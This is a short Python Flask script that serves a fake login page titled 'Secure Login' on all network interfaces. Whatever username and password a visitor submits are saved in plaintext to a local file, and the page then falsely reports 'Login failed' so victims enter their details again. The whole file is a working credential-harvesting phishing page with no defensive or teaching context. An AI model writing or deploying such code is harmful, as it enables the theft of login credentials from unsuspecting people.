from flask import Flask, request, render_template_string
import datetime

app = Flask(__name__)

# Simple HTML template
html = '''
<!DOCTYPE html>
<html>
<head><title>Secure Login</title></head>
<body>
    <h2>🔒 Login</h2>
    <form method="POST">
        Username: <input name="username"><br>
        Password: <input type="password" name="password"><br><br>
        <button type="submit">Login</button>
    </form>
</body>
</html>
'''

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        user = request.form.get('username')
        pwd = request.form.get('password')
        with open("logins.txt", "a") as f:
            f.write(f"[{datetime.datetime.now()}] Username: {user} | Password: {pwd}\n")
        return "<h3>Login failed. Try again.</h3>"
    return render_template_string(html)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
